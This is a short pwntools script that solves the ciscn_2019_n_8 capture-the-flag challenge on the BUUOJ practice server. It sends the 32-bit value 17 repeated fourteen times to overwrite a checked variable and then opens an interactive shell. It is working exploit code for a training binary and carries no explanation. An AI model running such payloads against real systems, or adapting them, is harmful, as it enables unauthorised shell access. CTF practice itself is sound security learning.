from pwn import *
context(log_level='DEBUG')
#io = process("./ciscn_2019_n_8")
io = remote('node3.buuoj.cn',29560 )
io.recv() 
payload = p32(17) * 14
io.sendline(payload)
io.interactive()